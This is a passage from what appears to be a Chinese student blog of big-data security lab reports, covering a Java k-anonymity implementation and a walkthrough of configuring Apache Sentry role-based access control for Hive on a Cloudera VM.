class="line">out.setDisease(org_k.get(m).getDisease());</span><br><span class="line">results.add(out);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//选取k条记录中的第一条记录的属性值作为上述标志属性的默认值，包括idNumberFirst</span></span><br><span class="line"><span class="keyword">if</span>(org_k.indexOf(i)==<span class="number">0</span>) &#123;</span><br><span class="line">idNumberFirst_flag=i.getIdNumberFirst();</span><br><span class="line">sex_flag=i.getSex();</span><br><span class="line">age_min=i.getAge();</span><br><span class="line">age_max=i.getAge();</span><br><span class="line">height_min=i.getHeight();</span><br><span class="line">height_max=i.getHeight();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断idNumberFirst属性的取值是否一致</span></span><br><span class="line">String idNumberFirst=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(idNumberFirst_flag!=i.getIdNumberFirst()) </span><br><span class="line">        idNumberFirst_flag=<span class="string">'*'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果k条记录的idNumberFirst属性的取值有不一致的，就均设为*，否则不变</span></span><br><span class="line"><span class="keyword">if</span>(idNumberFirst_flag == <span class="string">'*'</span>)</span><br><span class="line">        idNumberFirst=<span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        idNumberFirst=<span class="string">""</span>+idNumberFirst_flag;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Org.java */</span></span><br><span class="line"><span class="comment">//在org.java中添加idNumberFirst，并添加函数获取和发送idNumberFirst</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">char</span> idNumberFirst;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getIdNumberFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> idNumberFirst;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIdNumber</span><span class="params">(<span class="keyword">char</span> idNumberFirst)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.idNumberFirst = idNumberFirst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* k.java */</span></span><br><span class="line"><span class="comment">//在k.java中添加idNumberFirst，并添加函数获取和发送idNumberFirst</span></span><br><span class="line"><span class="keyword">private</span> String idNumberFirst;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getIdNumberFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> idNumberFirst;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIdNumberFirst</span><span class="params">(String idNumberFirst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.idNumberFirst = idNumberFirst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过k-匿名处理后，输出了1000条数据记录，但每条记录中只剩下泛化后的准标识符属性值和敏感属性值，理论上通过任意一组准标识符属性查询到的数据记录均有两条，用来切断准标识符属性和敏感属性的一对一关系，满足了k-匿名的处理要求，这里开始按照实验指导书上的要求做完实验后满足上述要求，但是由于自己做了创新后，输出1000条数据，没法准确判断，这里做数据截图如下，生成的完整数据会放到附件里，这里加入一个准标识符后比之前匿名化提供的信息更多；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205003115.png" alt=""></p></li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p>运行<code>DataGerenerate.java</code>生成1000条数据集合org；</p></li><li><p>设置匿名参数<code>k=2</code>；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> k=<span class="number">2</span>;</span><br></pre></td></tr></table></figure></li><li><p>创建<code>operation</code>对象，用于调用其内部的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Operation operation=<span class="keyword">new</span> Operation();</span><br></pre></td></tr></table></figure></li><li><p>获取原始数据集记录，并用<code>ArrayList</code>进行存储；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Org&gt;  org_lists=operation.getOrgData();</span><br><span class="line"><span class="comment">//读取原始的数据集</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Org&gt; <span class="title">getOrgData</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> ArrayList&lt;String&gt; org_list=<span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"> File file=<span class="keyword">new</span> File(<span class="string">"src/k_anonymity/org"</span>);</span><br><span class="line"> <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">System.out.println(<span class="string">"文件不存在！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    FileReader fReader=<span class="keyword">new</span> FileReader(file);</span><br><span class="line">    BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(fReader);</span><br><span class="line">    String str;</span><br><span class="line">    <span class="comment">// 按行读取字符串</span></span><br><span class="line">    <span class="keyword">while</span> ((str = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        org_list.add(str);</span><br><span class="line">    &#125;</span><br><span class="line">    bufferedReader.close();</span><br><span class="line">    fReader.close();</span><br><span class="line">    ArrayList&lt;Org&gt; orgs=<span class="keyword">new</span> ArrayList&lt;Org&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; org_list.size(); i++) &#123;</span><br><span class="line">        Org org=<span class="keyword">new</span> Org();</span><br><span class="line">        String org_ori=org_list.get(i);</span><br><span class="line">        String elements[]=org_ori.split(<span class="string">","</span>);</span><br><span class="line">        org.setNo(Integer.parseInt(elements[<span class="number">0</span>]));</span><br><span class="line">        org.setIdNumber(elements[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setSex(elements[<span class="number">2</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setAge(Integer.parseInt(elements[<span class="number">3</span>]));</span><br><span class="line">        org.setHeight(Integer.parseInt(elements[<span class="number">4</span>]));</span><br><span class="line">        org.setDisease(elements[<span class="number">5</span>]);</span><br><span class="line">        orgs.add(org);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> orgs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对原始数据进行k-匿名化处理；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;K&gt; results=operation.k_anonymous(org_lists, k);</span><br><span class="line"><span class="comment">//k-匿名处理</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;K&gt; <span class="title">k_anonymous</span><span class="params">(ArrayList&lt;Org&gt; org_lists, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">//用于存放匿名化后的数据</span></span><br><span class="line">ArrayList&lt;K&gt; results=<span class="keyword">new</span> ArrayList&lt;K&gt;();</span><br><span class="line"><span class="comment">//存放临时选取的k个原始记录</span></span><br><span class="line">ArrayList&lt;Org&gt; org_k=<span class="keyword">new</span> ArrayList&lt;Org&gt;();</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (Org j : org_lists) &#123;</span><br><span class="line">org_k.add(j);</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i%k==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//对k条记录中的准标识符进行泛化处理</span></span><br><span class="line">            K temp=generalize(org_k);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; k; m++) &#123;</span><br><span class="line">                K out=<span class="keyword">new</span> K();</span><br><span class="line">                out.setIdNumberFirst(temp.getIdNumberFirst());</span><br><span class="line">                out.setSex(temp.getSex());</span><br><span class="line">                out.setAge(temp.getAge());</span><br><span class="line">                out.setHeight(temp.getHeight());</span><br><span class="line">                out.setDisease(org_k.get(m).getDisease());</span><br><span class="line">                results.add(out);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//清除已经处理过的k个记录，用于存储下次选取的k条记录</span></span><br><span class="line">            org_k.clear(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对原始数据中的准标识符进行泛化；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对原始数据中的准标识符进行泛化</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> K <span class="title">generalize</span><span class="params">(ArrayList&lt;Org&gt; org_k)</span> </span>&#123;</span><br><span class="line">K temp=<span class="keyword">new</span> K();</span><br><span class="line"><span class="keyword">char</span> idNumberFirst_flag=<span class="string">' '</span>;</span><br><span class="line"><span class="keyword">char</span> sex_flag=<span class="string">' '</span>;</span><br><span class="line"><span class="keyword">int</span> age_min=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> age_max=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> height_min=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> height_max=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (Org i : org_k) &#123;</span><br><span class="line"><span class="comment">//选取k条记录中的第一条记录的属性值作为上述标志属性的默认值</span></span><br><span class="line"><span class="keyword">if</span>(org_k.indexOf(i)==<span class="number">0</span>) &#123;</span><br><span class="line">idNumberFirst_flag=i.getIdNumberFirst();</span><br><span class="line">sex_flag=i.getSex();</span><br><span class="line">age_min=i.getAge();</span><br><span class="line">age_max=i.getAge();</span><br><span class="line">height_min=i.getHeight();</span><br><span class="line">height_max=i.getHeight();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断idNumberFirst属性的取值是否一致</span></span><br><span class="line"><span class="keyword">if</span>(idNumberFirst_flag!=i.getIdNumberFirst()) </span><br><span class="line">                idNumberFirst_flag=<span class="string">'*'</span>;</span><br><span class="line"><span class="comment">//判断sex属性的取值是否一致</span></span><br><span class="line"><span class="keyword">if</span>(sex_flag!=i.getSex())</span><br><span class="line">                sex_flag=<span class="string">'*'</span>;</span><br><span class="line"><span class="comment">//判断Age的取值范围</span></span><br><span class="line"><span class="keyword">if</span>(age_min&gt;i.getAge())</span><br><span class="line">                age_min=i.getAge();</span><br><span class="line"><span class="keyword">if</span>(age_max&lt;i.getAge())</span><br><span class="line">                age_max=i.getAge();</span><br><span class="line"><span class="comment">//判断height的取值范围</span></span><br><span class="line"><span class="keyword">if</span>(height_min&gt;i.getHeight())</span><br><span class="line">                height_min=i.getHeight();</span><br><span class="line"><span class="keyword">if</span>(height_max&lt;i.getHeight())</span><br><span class="line">                height_max=i.getHeight();</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">String idNumberFirst=<span class="string">""</span>;</span><br><span class="line">String sex=<span class="string">""</span>;</span><br><span class="line">String age=<span class="string">""</span>;</span><br><span class="line">String height=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果k条记录的idNumberFirst属性的取值有不一致的，就均设为*，否则不变</span></span><br><span class="line"><span class="keyword">if</span>(idNumberFirst_flag == <span class="string">'*'</span>)</span><br><span class="line">            idNumberFirst=<span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">            idNumberFirst=<span class="string">""</span>+idNumberFirst_flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果k条记录的sex属性的取值有不一致的，sex就均设为*，否则不变</span></span><br><span class="line"><span class="keyword">if</span>(sex_flag == <span class="string">'*'</span>)</span><br><span class="line">            sex=<span class="string">"*"</span>;   </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">            sex=<span class="string">""</span>+sex_flag;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//如果k条记录中年龄的最大值和最小值相等</span></span><br><span class="line"><span class="keyword">if</span>(age_min%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; age_max%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; age_min==age_max ) </span><br><span class="line">        &#123;</span><br><span class="line">age_min=(age_min/<span class="number">10</span>)*<span class="number">10</span>;</span><br><span class="line">age_max=age_min+<span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">age=age_min+<span class="string">"~"</span>+age_max;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//如果k条记录中身高的最大值和最小值相等</span></span><br><span class="line"><span class="keyword">if</span>(height_min%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; </span><br><span class="line">           height_max%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; </span><br><span class="line">           height_min==height_max) </span><br><span class="line">        &#123;</span><br><span class="line">height_min=(age_min/<span class="number">10</span>)*<span class="number">10</span>;</span><br><span class="line">height_max=age_min+<span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">height=height_min+<span class="string">"~"</span>+height_max;</span><br><span class="line"></span><br><span class="line">temp.setIdNumberFirst(idNumberFirst);</span><br><span class="line">temp.setSex(sex);</span><br><span class="line">temp.setAge(age);</span><br><span class="line">temp.setHeight(height);</span><br><span class="line"><span class="keyword">return</span> temp; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将匿名化后的数据输出到<code>k</code>中，程序结束；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">operation.printResults(results);</span><br><span class="line">System.out.println(<span class="string">"done"</span>);</span><br><span class="line"><span class="comment">//输出匿名化后的结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printResults</span><span class="params">(ArrayList&lt;K&gt; results)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">File file=<span class="keyword">new</span> File(<span class="string">"src/k_anonymity/k"</span>);</span><br><span class="line"><span class="keyword">if</span> (!file.exists()) &#123; </span><br><span class="line">file.createNewFile();</span><br><span class="line">&#125;</span><br><span class="line">   FileWriter writer=<span class="keyword">new</span> FileWriter(file);</span><br><span class="line">   BufferedWriter bufferedWriter=<span class="keyword">new</span> BufferedWriter(writer);</span><br><span class="line">   <span class="keyword">for</span> (K k : results) &#123;</span><br><span class="line">bufferedWriter.write(k.toString());</span><br><span class="line">bufferedWriter.newLine();</span><br><span class="line">bufferedWriter.flush();</span><br><span class="line">&#125;</span><br><span class="line">bufferedWriter.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 大数据安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k-匿名算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Sentry的权限分配实验</title>
      <link href="/Apache-Sentry%E7%9A%84%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D%E5%AE%9E%E9%AA%8C.html"/>
      <url>/Apache-Sentry%E7%9A%84%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D%E5%AE%9E%E9%AA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>通过Apache Sentry对Hadoop系统中的数据实现细粒度控制；</li><li>学会使用Cloudera Manager快速管理和部署Hadoop相关服务.  </li></ol><a id="more"></a><h1 id="软件设备"><a href="#软件设备" class="headerlink" title="软件设备"></a>软件设备</h1><ul><li><p>软件设备</p><ul><li>VMware虚拟机运行程序</li><li>cloudera-quickstart-vm-5.13.0-0 虚拟机（下载网址：<a href="https://downloads.cloudera.com/demo_vm/vmware/cloudera-quickstart-vm-5.13.0-0-vmware.zip）" target="_blank" rel="noopener">https://downloads.cloudera.com/demo_vm/vmware/cloudera-quickstart-vm-5.13.0-0-vmware.zip）</a></li></ul></li><li><p>硬件设备</p><ul><li>可运行虚拟机的windows 10宿主机</li></ul></li></ul><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>在未使用Sentry前，Hadoop对用户的授权是粗粒度级的，用户或者不能访问文件内的数据或者能访问整个文件的数据。Sentry可以控制用户对Hadoop中数据的访问，并对已通过验证的用户提供数据访问特权。该特权可细分到查找、插入、删除等操作的控制以及用户可查看数据库中的哪些数据。</p><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>熟悉Cloudera Manager，并在系统中部署Apache Sentry服务；</li><li>使用Apache Sentry对数据库实现简单的授权管理；</li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="Apache-Sentry安装步骤"><a href="#Apache-Sentry安装步骤" class="headerlink" title="Apache Sentry安装步骤"></a>Apache Sentry安装步骤</h2><ol><li><p>使用vmware打开cloudera-quickstart-vm-5.13.0-0 虚拟机文件并调整虚拟机参数如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203110703.png" alt=""></p></li></ol><ol start="2"><li><p>进入系统后打开终端，输入<code>sudo /home/cloudera/cloudera-manager --force --express</code> 命令，等待cloudera manager启动。出现<code>Username: cloudera</code>和<code>Password: cloudera</code>表明Cloudera Manager启动成功；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112532.png" alt=""></p></li></ol><p>   点击浏览器书签栏的Cloudera Manager书签，网页载入完毕后会弹出提示信息，点击<code>I Agree</code>，输入之前获取的用户名和密码进入图形化管理界面；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112701.png" alt=""></p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112746.png" alt=""></p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203113051.png" alt=""></p><ol start="3"><li><p>切换到终端，输入<code>mysql -u root -p</code>进入数据库，密码为上一步的<code>cloudera</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203113229.png" alt=""></p></li></ol><p>   进入数据库后，通过命令删除sentry@’%’用户以及sentry数据库；</p><ul><li><p>删除前<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115224.png" alt=""></p></li><li><p>删除</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115449.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115508.png" alt=""></p></li><li><p>删除后</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115559.png" alt=""></p><p>然后重新创建sentry用户和sentry数据库，并对新创建的sentry用户赋予对sentry数据库的全部操作权限；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create user sentry identified by &#39;sentry123456&#39;;</span><br><span class="line">grant all on sentry.* to sentry@&#39;localhost&#39; identified by &#39;sentry123456&#39;;</span><br><span class="line">grant all on sentry.* to sentry@&#39;%&#39; identified by &#39;sentry123456&#39;;</span><br><span class="line">create database sentry;</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203120432.png" alt=""></p></li></ul><ol start="4"><li><p>切换到浏览器中Cloudera Manager管理界面，点击左侧管理面板的小三角，选择<code>Add Service</code>，下拉选择<code>Sentry</code>，点击<code>Continue</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203120929.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203121021.png" alt=""></p></li></ol><p>   到达Customize Role assignments for Sentry界面后不进行修改，点击<code>Continue</code>；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203163649.png" alt=""></p><p>   到达Database Setup部分，输入前面步骤中设置的sentry数据库名称“sentry”、用户名以及密码，并点击<code>Test Connection</code>确保可连接；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203163925.png" alt=""></p><p>   完成后，点击<code>continue</code>等待各个服务重启，全部完成后点击<code>continue</code>，之后点击<code>finish</code>完成<strong>sentry服务</strong>的添加；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203164238.png" alt=""></p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203164333.png" alt=""></p><ol start="5"><li><p>配置Hive</p><p>进入浏览器中Cloudera Manager主界面，点击左侧栏的<code>Hive</code>。进入Hive设置界面后点击左上角的<code>Configuration</code>，在下方界面的Search输入<code>sentry</code>，并将<code>Sentry Service</code>选项修改为<code>Sentry</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165013.png" alt=""></p></li></ol><p>   之后在Search输入<code>imper</code>，取消<code>Impersonation</code>的相关选项；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165111.png" alt=""></p><p>   完成后在Search输入<code>sentry-site</code>，点击加号添加<code>sentry.hive.testing.mode</code>键并将值设为<code>true</code>；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165225.png" alt=""></p><p>   之后点击<code>Save Changes</code>，并回到主界面，点击左侧新出现的红色扳手；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165454.png" alt=""></p><p>   弹出窗口后点击<code>Enable Stored Notifications in Database</code>，勾选相关选项并点击<code>Save Changes</code>保存配置，然后点击右侧的蓝色文件图标提交修改的配置文件并重新启动所有相关服务；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165625.png" alt=""></p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165656.png" alt=""></p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203170352.png" alt=""></p><p>   重启后进入主界面，重启虚拟机，并再次运行桌面上的cloudera express，进入浏览器等待程序运行完毕，登录cloudera manager，点击左侧栏的蓝文件图标更新配置文件并重启到如下状态开始相关实验；</p><p>   <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203190339.png" alt=""></p><h2 id="实验数据库搭建"><a href="#实验数据库搭建" class="headerlink" title="实验数据库搭建"></a>实验数据库搭建</h2><ol><li><p>打开终端，输入<code>beeline</code>打开beeline命令行终端。进入beeline后输入<code>!connect jdbc:hive2://localhost:10000</code>链接数据库，用户名为<code>hive</code>，密码为空；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203192725.png" alt=""></p></li></ol><ol start="2"><li><p>输入命令<code>create role admin_role;</code>创建管理员角色；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195259.png" alt=""></p><p>通过命令<code>grant all on server server1 to role admin_role;</code>赋予其对server1(系统中的服务器名称)服务器的所有操作权限；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195448.png" alt=""></p><p>通过<code>grant role admin_role to group hive;</code>命令将admin_role拥有的权限添加到hive组中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195639.png" alt=""></p></li></ol><ol start="3"><li><p>关闭当前终端，再次使用hive登录系统执行如下操作：</p><ol><li><p>输入<code>create database school;</code> 创建school数据库；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200133.png" alt=""></p></li><li><p>输入<code>use school;</code>切换到school数据库；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200216.png" alt=""></p></li><li><p>输入<code>create table gradebook(id string, first string, last string, grade int) row format delimited fields terminated by &#39;,&#39;;</code> ‘创建gradebook表，该表包含id、first、last和grade列；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200410.png" alt=""></p></li><li><p>输入<code>insert into gradebook values(&#39;10001&#39;,&#39;san&#39;,&#39;zhang&#39;,80),(&#39;10002&#39;,&#39;si&#39;,&#39;li&#39;,90);</code>插入两条数据，该过程较慢，需等待片刻；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200726.png" alt=""></p></li><li><p>输入<code>select * from gradebook;</code>确定数据有正确插入到数据库中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200900.png" alt=""></p></li></ol></li></ol><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><ol><li><p>打开新的终端，输入<code>sudo useradd student</code>、<code>sudo useradd grader</code>，分别创建一个student用户和grader用户，并通过<code>sudo passwd student</code>、<code>sudo passwd student</code>设置密码；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202141.png" alt=""></p></li><li><p>回到beeline终端，输入<code>create role student_role;</code>创建新角色；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202350.png" alt=""></p></li><li><p>输入<code>grant select (id,first,last)on table gradebook to role student_role;</code>使student_role只能读取gradebook表的id、first、last列；</p><p><img 